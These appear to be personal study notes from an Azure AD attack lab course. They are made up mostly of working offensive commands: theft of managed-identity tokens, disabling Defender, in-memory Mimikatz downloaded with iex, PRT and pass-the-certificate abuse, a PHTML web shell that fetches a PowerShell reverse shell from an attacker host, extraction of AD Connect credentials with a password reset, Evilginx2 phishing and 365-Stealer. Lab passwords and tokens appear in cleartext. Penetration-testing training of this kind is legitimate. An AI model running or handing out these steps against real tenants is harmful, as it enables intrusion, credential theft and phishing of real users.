	passwords should have ' SecureString ' type. In case of a poorly written
	deployment template that uses 'String' for such a parameter we can
	get password in clear text!
	

## Github & Function app - LO19 p.91
Edit & commit code which reads out environmental variable of IDENTITY_ENDPOINT and IDENTITY_HEADER makes a request to Azure API with these and so you will get the accesstoken back if there is a managed identity used by the function app; wait a few minutes and visit Website. Recall that this is the code that we got from app.zip from the defcorpbackup storage account:

import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
	logging.info('Python HTTP trigger function processed a request.')
	IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
	IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
	cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
	val = os.popen(cmd).read()
	return func.HttpResponse(val, status_code=200)

After that connect:
	> $accesstoken = 'eyJ0…'
	> Connect-AzAccount -AccessToken $AccessToken -AccountId 95f40eea-6653-4e11-b545-d9c2f5f90a29
	
	• Check if the managed identity can read any deployment from the resource group
	Get-AzResourceGroup
	Get-AzResourceGroupDeployment -ResourceGroupName [ResourceNamefromCommandBefore]
	
	• Save the deployment template locally
	Save-AzResourceGroupDeploymentTemplate -ResourceGroupName [ResourceNamefrom2CommandBefore] -DeploymentName [NamefromCommandBefore] 
	=> Check for Creds
	
	Find Creds with this little script
	(cat C:\AzAD\Tools\stevencking_defcorphq.onmicrosoft.com.sapsrv.json | ConvertFrom-Json | select -ExpandProperty Resources).resources.Properties.Settings.CommandToExecute


## Administrative Unit

	• Get all administrative units
	Get-AzureADAdministrativeUnit -all $true
	
	• Get information and membership of this administrative unit
	Sepereate Powershell
	Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
	Connect-AzureAD -Credential $creds
	
	Sepereate Powershell
	Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
	Get-AzureADMSAdministrativeUnit -Id e1e26d93-163e-42a2-a46e-1b7d52626395
	Get-AzureADMSAdministrativeUnitMember -Id e1e26d93-163e42a2-a46e-1b7d52626395
	Get-AzureADMSScopedRoleMembership -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
	Get-AzureADDirectoryRole -ObjectId 5b3935ed-b52d-4080-8b05-3a1832194d3a
	
	• Get any roles scoped to this administrative unit:
	Get-AzureADMSScopedRoleMembership -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
	
	• Check the role based on the ID we got from before
	Get-AzureADDirectoryRole -ObjectId 1341…..

"Access has been blocked by Conditional Access policies"
	• Try Chrome, F12, Change user-agent
	• 


Remote Powershell Session To VM
	$password = ConvertTo-SecureString 'StudxPassword@123' -AsPlainText -Force
	$creds = New-Object System.Management.Automation.PSCredential('studentx', $password)
	$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
	Enter-PSSession -Session $jumpvm
	Set-MpPreference -DisableRealtimeMonitoring $true

	• Copy Files to running PSSession
	Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\AzureADJoinedMachintPTC-master.zip -Destination C:\Users\studentx\Documents -Verbose
	
	• Run command within an established Powershell Session
	 Invoke-Command -Session $infradminsrv -ScriptBlock{hostname}

	• Run a File
	Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose

## Mimikatz on VM
	
	• Extract local credentials with Mimikatz
	iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
	Mimikatz -Command '"token::elevate" "lsadump::secrets"'

	• Extract PRT and session key of a Azure Ad Joined Device
	dsregcmd /status   => AzureAdJoined: Needs to be Yes
	Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
		=> Take "Prt:…." and "KeyValue:…." and "Tenant-Id"
	
	• Get the context/Clear key and derived key:
	Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:AQAAAAA.... /unprotect" "exit"'
	
	• Copy PrtToCrt to PSsession
	Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PrtToCert-master.zip -Destination C:\Users\vmuser\Documents\student6 -Verbose
	
	Expand-Archive -Path C:\Users\vmuser\Documents\studentx\PrtToCert-master.zip -DestinationPath C:\Users\vmuser\Documents\studentx\PrtToCert
	
	Request a certificate from AzureAD for the user samcgray
	& 'C:\Program Files\Python39\python.exe' C:\Users\vmuser\Documents\studentx\PrtToCert\RequestCert.py --tenantId 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 --prt MC5BWEFBS2N...... --userName samcgray@defcorphq.onmicrosoft.com --hexCtx 0e3f7dbc9ff227ca2a93e6a31b1f11c104d51e2f1b9ae498 --hexDerivedKey
	b088fa5bba5ee9ba6a9a7ffcb7a2143405065526bce9fd3b69acb6f3c3f3709b
	

	• Download Mimikatz on another powershell session
	Invoke-Command -Session $infradminsrv -ScriptBlock{Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'}

	• Download Mimikatz from Internet
	iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
	
	• Extract PRT and Session key
	iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
	Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
		In output "Prt" = PRT and " KeyValue" = Session key
		
	• Get the Context and derived key via Session key
	iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
	Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:AQAAAAA.... /unprotect" "exit"'
		In output "Context" = Context Key


## PRT to Cert
	• Copy local files to VM (Connect first)
	Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PrtToCert-master.zip -Destination C:\Users\vmuser\Documents\studentx –Verbose
	Expand-Archive -Path C:\Users\vmuser\Documents\studentx\PrtToCert-master.zip -DestinationPath C:\Users\vmuser\Documents\studentx\PrtToCert
	
	• Request a Cert from AzureAD
	& 'C:\Program Files\Python39\python.exe' C:\Users\vmuser\Documents\studentx\PrtToCert\RequestCert.py --tenantId 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 --prt MC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b2M3cWpodG9CZElzblY2TVdtSTJUdHdBTEUuQWdBQkFBQUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dRQTlQOW5URy1lUnhyWDA3UldjV2t4RlNyWEk1c0ZVcWhmZGNFVGd4N3pyYWRrdE1GV0d5Tk9KdjdIOVFxUDhsSG84UEFlYmF0SGJDa2Q2blNsbGlubzc4TkpmSmZtNjkxbGw2bFBuLW5PaXJ4UnNZSGZ0NEE0Q1NTbVRaNGNpODdZZUQtZVN1WmFuN0FlMXpwTm01THBvSVdiaFl1eGlDclZKRWUxZnFuOGJqUXMyeVBsMnF3Z29MaG51SlFGQlh6T0RzOVBkMGZ0YzJ1QkVEMDBpTkxZYUN0ZjVjWmZCZDlJTWRkYXlpSXJzc3FuaVpmbTF2WDlRR29zVkpubWs2WEdvd1pSMVg2azYwZHdCWU5FQ2RUNG0tSUdKWnNjM1hnUHBUZ2FxRTNjTC1RNDJydXBaRk9WZEZfQnMyb0xZcmFjQ0ZhMlZMTktqQVdHOEo2MlZEcDd0ZzBsY0QtenYyRnQ4bVVUbW1xWnlMcXQ4enNDb3lwZkowYkRORDIyTDRKZlJ2dVZoMHpVN1BFMnltTXFpdC1pVFpocXFZbnh3THhLWThHV2IwMG4tTTEwaWRick5rV3VOM2ttV3BERVh3Q2tLQ092R3lDNWQ2bW5xUkVFRVpaeDNfYnpza0k4cUhuQUI0NUR0MllmMDFxZDQzTDRDbTVIRVJIcVRNUERjYm50Zzh5VmdQX3g4Mnh3VnZVUThIM2lsdmk3UW5pR3JtU0VtSzI5TzFpN1FmdlA2M3o0aGVSYVBvOUVCZ016bEtDZ2ZWVWFIcjl5VDFhMVZqYml0S09HVThfdFVpUmlwcEhRMXpTNnVOakR5WVlzeVZBYkY1bjdmMTYtWUlTVWxRZTNfYnR3OW41SmVlQ2I3Ri0xRUtJS1pMdXNjME11dW5FZVJZMVpHd0FkcE5sYmliSm5CcWh5UkdDREFldVptdklycjI2V2xsS2d3N2NuS1h2cDdITnZkZW5ibDNhbllCQkNRa3pqVDZ4Vzl0TEtXWlc1aXNnRmV3SjVUWEtpSjEta0x5V0tJT0ctV2J0MXVzanRvMXI2X1djMlEzNFVQQl9sZkpjRWF0Q3ZjUUJfRXVYN2ZKSE14QU9ucDRNOEQ1aEZxQ3BndThZTXhia0M2aFQzQ2pSR2R4V3MwbWVPa0pIXzNBMEZuRGZ3QTlXRFQ3WmtsaVFEeUw2Tkltcy0tMTd2cW1Nb19IeDFQX21CeXBTUTJZazZYSFg3bmhwck1vdm1YNDRiT3hXcGtTMWk5N3g4dktzMi1FQUtmSVR5MTR4R1hWNHBoYjk1akZ0RGJVWHp2QXZoa1VGWnozU3RRQUhXRkVRei1vOGNzRXRFWDZDTS04RjlibzNYSDJjMGY1YXdhWGY3Sm5yQ1BNY3JnUkdnUlRCQlpYVnRpWG9ZRjdpRWxB. --userName samcgray@defcorphq.onmicrosoft.com --hexCtx 8e5ffb8b869924dfca5ac1e9d9b04ac6d26f3180622f6771 --hexDerivedKey 34f3a9d0b9d5d249dc07bf169f6d6bc1044769322814d451b18b128b4031f2c5
		Use the PRT with –prt option, Context key with –hexCtx and DerivedKey with the –hexDerivedKey option:
		Output is Certificate and Password of the private key
		
		

Check on the VM if it is Azure AD joined
	dsregcmd /status
	

Use PHTML Reverse Shell an connect to listening NC
	1. Upload 
	2. Find URL for Command exec
		E.g. https://fms-defcorphq.msappproxy.net/dist/uploads/studentxshell.phtml?cmd=whoami
	3. Start nc listening on your host
		C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
	4. Prepare Webserver to deliver Invoke-PowerShellTcp.ps1
		Run Xampp as admin, start apache
		Copy Invoke-PowerShellTcp.ps1 to htdocs
	5. Open Reverse shell
	https://fms-defcorphq.msappproxy.net/dist/uploads/studentxshell.phtml?cmd=powershell iex (NewObject Net.Webclient).downloadstring('http://172.16.x.x:82/Invoke-PowerShellTcp.ps1');reverse -Reverse -IPAddress 172.16.x.x -Port 4444
	6. Run mimikatz in memory - profit
		iex (New-Object Net.Webclient).DownloadString("http://172.16.x.x:82/Invoke-Mimikatz.ps1") 
		 Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
		
	
Reverse Shell Listener
	C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444


Execute command on Remote VM
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose


Execute command on Remote VM with Certificate
	Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\AzureADJoinedMachintPTC-master.zip -Destination C:\Users\studentx\Documents -Verbose
	Enter-PSSession $jumpvm
	Expand-Archive -Path C:\Users\vmuser\Documents\studentx\AzureADJoinedMachintPTC-master.zip -DestinationPath C:\Users\vmuser\Documents\studentx\AzureADJoinedMachinePTC
	python C:\Users\vmuser\Documents\studentx\AzureADJoinedMachinePTC\Main.py --usercert C:\Users\vmuser\Documents\studentx\samcgray@defcorphq.onmicrosoft.com.pfx --certpass AzureADCert --remoteip 10.0.1.5 --command "cmd.exe /c net user studentx StudxPassword@123 /add /Y && net localgroup administrators studentx /add"
	
	
## Service Principal
	Managed Identities are special Service Principal
	• Enumerate the service principal  of an App ID / Managed Identity
	Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "62e44426-5c46-4e3c-8a89-f461d5d586f2"} | fl
		ServicePrincipalType
		
	• Login as Service principal with password
	$password = ConvertTo-SecureString '_1ATfh--GD.WBhRuP.H3p_iR~MX2W1OA6S' -AsPlainText -Force
	$creds = New-Object System.Management.Automation.PSCredential('[app-id]', $password)
	Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
	
	• Login as Service principal with certificate
	Connect-AzAccount -ApplicationId $appId -Tenant $tenantId -CertificateThumbprint <thumbprint>
		
## Managed Identity
Managed Identities are special Service Principal
There are system assigned  and user assigned managed identities
	System: A Managed identity will be tied by Azure AD to an app
That means, we can enumerate the service principals in Azure AD and check the service principal that the AppID 62.. Belongs to.
Displayed "Client ID" is also the AppID
	• Connect-AzureAD
	• Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "62e44426-5c46-4e3c-8a89-f461d5d586f2"} | fl

	• Check the permissions of the managed identity on the resource (here virtual machine) from the Get-AzResource command before
	$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-
	d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/provide
	rs/Microsoft.Authorization/permissions?api-version=2015-07-01'
	
	$RequestParams = @{
		Method = 'GET'
		Uri = $URI
		Headers = @{
			'Authorization' = "Bearer $Token"
		}
	}
	(Invoke-RestMethod @RequestParams).value


## Change User-Agent in Chrome to (maybe) circument Conditional Access
	• Chrome, F12, Press right Icon, Change on top your Device/useragent
	

Check for Deployments / Deployment Templates with Useful Information
	• Resource Group / Settings \ Deployments / Templates
	E.g "$username = \"thomasebarlow@defcorpit.onmicrosoft.com\";$password=\"%%^Da@asyu0(@*&48VVf6\";$SecurePassword = ConvertTo-SecureString 
		Only red marked is the password


## Dynamic Groups - LO22
	Default: Every User can Invite Guest Users
	You can not add secondary email from the portal (as a Guest User) - you need to use Powershell
	The needed object ID  of the User can only be enumerated by an already internal user and not the new guest!
	
	• Enumerate Dynamic Groups
	Login to portal.azure.com / Azure AD / Groups - Check for Membership Type: Dynamic
	Open Group / Dynamic Membershipt Rules / See Rule Syntax
	
	• Attack: Invite Guest User & change secondary email to get him/her in the dynamic group!
	Users / Invite Guest Users 
	Open User and and click (manage) under Invitation accepted / Resend the link & open the URL in Incognito
	Login withe the Guest Account
		Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
		$password = ConvertTo-SecureString 'Passwordforstudentx' -AsPlainText -Force
		$creds = New-Object System.Management.Automation.PSCredential('studentx@defcorpextcontractors.onmicrosoft.com', $Password)
		Connect-AzureAD -Credential $creds -TenantId b6e0615d-2c17-46b3-922c-491c91624acd
	Get Object-ID from the Guest user from the regular user via portal
	Edit the secondary email for the user to let the dynamic group apply$
		Set-AzureADUser -ObjectId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendor6@defcorpextcontractors.onmicrosoft.com -Verbose
		

OS Command injection - Get Access Token Management API & Graph API
	• Use forms with
	; ls -al /tmp/;
	; ls -al /tmp/student6;   //find upload path
	Upload python shell student6.py  (maybe zipped)
	Run it with ; python /tmp/uploads/student6_pyshell/student6.py;
	Get 
	
	
Application Proxy / Cloud-to-On-Prem lateral movement - Slide 190
Connect-AzureAD first
	1. Enumerate the applications that has application proxy configured  (takes time)
	Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
	
	URL
	DisplayName
	App-ID
	
	2. Enumerate the Service Principal  for the app (Enterprise Application)
	Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
	=> Output use Object-ID in the command after the next
	
	3. Get Users & Groups assigned to the Application Proxy application - Use Get-ApplicationProxyAssignedUsersAndGroups.ps1 to find users and groups assigned to the application:
	. C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1
	Use Get-ApplicationProxyAssignedUsersAndGroups.ps1 to find users and groups assigned to the application. Pass the ObjectID of the Service Principal to it
	Get-ApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362
	
	
	• Exploit a web application vuln, upload a php shell and start nc, get a connect and run mimikatz go get other users

Pass-the-PRT Attack
 - Lab guide page 104

Pass-the-certificate Attack
 - Presentation page 175
- Lab guide page 98

On-Prem, Azure AD Connect, Azure AD 
	• Check if Azure AD connect is installed on a VM
	Get-ADSyncConnector
	
	• Extract Credentials for the Sync user on the azure ad connect
	Set-MpPreference -DisableRealtimeMonitoring $true
	Exit
	Copy-Item -ToSession $adcnct -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
	Enter-PSSession $adcnct
	Set-MpPreference -DisableRealtimeMonitoring $true
	Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
	Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
	Get-AADIntSyncCredentials
	
	• Use the credentials of the Sync_* account to request an access token for AADGraph API and save it to cache
	$passwd = ConvertTo-SecureString '[from above]' -AsPlainText -Force
	$creds = New-Object System.Management.Automation.PSCredential ("Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd)
	Get-AADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
	
	• Get the ImmutableId for the onpremadmin user
	Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
	
	• Reset the onpremadmin user's password using the below command
	Set-AADIntUserPassword -SourceAnchor "E2gG19HA4EaDe0+3LkcS5g==" -Password "SuperSecretpass#12321" –Verbose
	


## Consent / Illicit Consent Grant Attack - LO9
	• Check if users are allowed to consent to apps (from the logged in Tenant)
	Remove-Module AzureAD
	Import-Module AzureADPreview  - or - Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
	$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
	$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
	Connect-AzureAD -Credential $creds
	(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
		When answer like the following, that means users can consent for all apps: ManagePermissionGrantsForSelf.microsoft-user-default-legacy
	
Tools

	SSH Key location
	C:\Users\studentuser6\.ssh

	SSH login with key
	ssh -T git@github.com

	Enumerate used Azure services with Microburst
	(Microburst is a useful tool for security assessment of Azure. It uses Az , AzureAD , AzurRM and MSOL tools and additional REST API calls!)
	Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -verbose
	Invoke-EnumerateAzureSubDomains -Base defcorphq -verbose
		==> Takes time
	
	• Use Roadrecon for Recon/Enumeration
	Start Powershell as administrtor!
	cd C:\AzAD\Tools\ROADTools
	pipenv shell
	roadrecon auth -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234
	roadrecon gather --mfa
	roadrecon gui
	Chrome http://127.0.0.1:5000/

	• List All relationships on Keyvaults
	cd C:\AzAD\Tools\stormspotter\backend\
	pipenv shell
	python ssbackend.pyz
	-- other powershell --
	cd C:\AzAD\Tools\stormspotter\frontend\dist\spa\
	quasar.cmd serve -p 9091 --history
	-- other powershell --
	cd C:\AzAD\Tools\stormspotter\stormcollector\
	pipenv shell
	az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234
	python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli
	Now, browse http://localhost:9091
	Username: neo4j
	Password: BloodHound
	Server: bolt://localhost:7687
	uplaod the ZIP
	Click Refresh
	Go to the 'QUERIES' tab on the right side, expand 'Show All RBAC Relationships'

	•  Evilginx2 - Lab Guide - LO17 - page 74
	• Start evilginx2:
	evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
	• Configure the domain:
	config domain studentx.corp
	• Set the IP for the evilginx server
	config ip 172.16.x.x
	• Use the template for Office 365
	phishlets hostname o365 login.studentx.corp
	• Verify the DNS entries
	phishlets get-hosts o365
	• Copy the certificate and private key - o365.crt and o365.key from
	C:\studentx\.evilginx\crt to C:\studentx\.evilginx\crt\ login.studentx.corp
	• Enable phishlets
	phishlets enable o365
	• Create the phishing URL (tied to an ID)
	lures create o365
	• Get the phishing URL
	lures get-url <ID>
	• Share the URL with the victim. (For the lab, send an email using your personal
	email).
	
	
	
	• Bloodhound
	•Run the collector to gather data
	$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
	$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
	Connect-AzAccount -Credential $creds
	Connect-AzureAD -Credential $creds
	. C:\AzAD\Tools\AzureHound\AzureHound.ps1
	Invoke-AzureHound -Verbose
	
	Open the BloodHound application (C:\AzAD\Tools\BloodHound-win32-x64\BloodHound-win32-x64\BloodHound.exe) and
	login using following details
	bolt://localhost:7687
	Username: neo4j
	Password: BloodHound
	• Upload the ZIP archive to BloodHound UI (drag and drop) and use built-in or custom Cypher queries to query the data.
	• Click on Raw Query in Bloodhound at the bottom!
	
	• Find all users who have the Global Administrator role
	MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
	• Find all paths to an Azure VM
	MATCH p = (n)-[r]->(g: AZVM) RETURN p
	• Find all paths to an Azure KeyVault
	MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
	• Find all paths to an Azure Resource Group
	MATCH p = (n)-[r]->(g:AZResourceGroup) RETURN p
	• Find Owners of Azure Groups
	MATCH p = (n)-[r:AZOwns]->(g:AZGroup) RETURN p
	
	
	• O365 creeper install
	Python -m pip install requests
	C:\Python27\python.exe -m pip install requests
	
	• 365-stealer
	PS C:\AzAD\Tools> cd C:\xampp\htdocs\365-Stealer 
	PS C:\xampp\htdocs\365-Stealer> &"C:\Program Files\Python38\python.exe" C:\xampp\htdocs\365-Stealer\365-Stealer.py --run-app
	
	Gui for stolen creds: http://localhost:82/365-Stealer/yourvictims/

	• Enumerate Azure Blobs mit Microburst
	• Add common, backup, code etc. to permutations.txt in C:\AzAD\Tools\Microburst\Misc
	PS C:\AzAD\Tools> . C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
	PS C:\AzAD\Tools> Invoke-EnumerateAzureBlobs -Base defcorp
	=> Open URLs in Browser????
	=> Take the <name></name> and add to URL e.g.:
		<EnumerationResults ServiceEndpoint="https://defcorpcommon.blob.core.windows.net/" ContainerName="backup">
		<Blobs>
		<Blob>
		<Name>blob_client.py</Name>
		 =>https://defcorpcommon.blob.core.windows.net/backup/blob_client.py
		 => Get SAS URL after "# URL"
		 => Or get account_key
		=> Start Azure Storage Explorer, Select Blob, SAS

	
	• List Storage Accounts
	Get-AzStorageAccount | fl
	
	• Check for logged in Users in az cli
		• az ad signed-in-user show 
